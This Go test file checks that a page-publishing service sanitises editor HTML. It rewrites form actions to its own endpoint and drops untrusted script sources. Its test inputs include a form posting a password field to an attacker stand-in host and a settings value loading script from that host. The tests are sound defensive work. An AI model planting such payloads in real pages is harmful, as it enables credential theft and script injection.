package tests

import (
	"strings"
	"testing"
)

// A page with a grapesjs-forms form: kept, posting to luna-forms of this
// application whatever the editor wrote, with luna-forms' script.
func TestPageWithForm(t *testing.T) {
	w := newWorld(t)
	c := w.as(w.writer)
	c.PutJSON("/v1/editor/pages/"+homeID, map[string]any{"name": "Contact", "slug": "/contact", "data": project}).AssertCreated()
	c.PostJSON("/v1/editor/pages/"+homeID+"/publish", map[string]any{
		"html": `<h1>Write to us</h1><form class="gjsf-form" data-gjsf-form="f-1" action="http://localhost:5174/x" method="post">` +
			`<input type="email" name="email" required><button type="submit">Send</button></form>` +
			`<form action="https://evil.example"><input name="pw"></form>`,
	}).AssertOK().AssertJSONCount("warnings", 0)
	r := w.as(w.reader).GetJSON("/v1/render?slug=/contact").AssertOK().
		AssertJSONCount("scripts", 1).AssertJSONPath("scripts.0", "https://forms.test/runtime.js")
	htmlHas(t, r, []string{
		`<form class="gjsf-form" data-gjsf-form="f-1" action="https://forms.test/submit/` + shopID + `/forms/f-1/submissions" method="post">`,
		`<input type="email" name="email" required=""/>`,
		`<script src="https://forms.test/runtime.js" defer></script>`,
	}, "evil.example", `name="pw"`, "localhost:5174")

	// A page without a form needs no script.
	c.PutJSON("/v1/editor/pages/"+grinderID, map[string]any{"name": "About", "slug": "/about", "data": project}).AssertCreated()
	c.PostJSON("/v1/editor/pages/"+grinderID+"/publish", map[string]any{"html": `<p>About</p>`}).AssertOK()
	r = w.as(w.reader).GetJSON("/v1/render?slug=/about").AssertOK().AssertJSONCount("scripts", 0)
	htmlHas(t, r, []string{"<p>About</p>"}, "<script")
}

// A page with grapesjs-darkreader's settings: kept as data, with this
// service's theme script; Dark Reader from PAGES_DARKREADER_SRC only.
func TestPageWithTheme(t *testing.T) {
	w := newWorld(t)
	c := w.as(w.writer)
	c.PutJSON("/v1/editor/pages/"+homeID, map[string]any{"name": "Home", "slug": "/", "data": project}).AssertCreated()
	c.PostJSON("/v1/editor/pages/"+homeID+"/publish", map[string]any{
		"html": `<button class="gjs-theme-toggle" data-gjs-theme-toggle type="button">◐</button>` +
			`<script type="application/json" data-luna-darkreader>{"on":true,"src":"https://evil.example/x.js","scheme":"light"}</script>`,
	}).AssertOK().AssertJSONCount("warnings", 0)
	r := w.as(w.reader).GetJSON("/v1/render?slug=/").AssertOK().
		AssertJSONCount("scripts", 1).AssertJSONPath("scripts.0", "http://pages.test/runtime/theme.js")
	htmlHas(t, r, []string{
		`<button class="gjs-theme-toggle" data-gjs-theme-toggle="" type="button">◐</button>`,
		`<script type="application/json" data-luna-darkreader="">{"on":true,"scheme":"light"}</script>`,
		`<script src="http://pages.test/runtime/theme.js" defer></script>`,
	}, "evil.example")

	js := w.as(w.reader).Get("/runtime/theme.js").AssertOK().AssertHeader("Content-Type", "text/javascript; charset=utf-8")
	if !strings.Contains(js.Text(), `c.src="https://cdn.test/darkreader.js"`) {
		t.Fatalf("theme.js: %.200s", js.Text())
	}
}
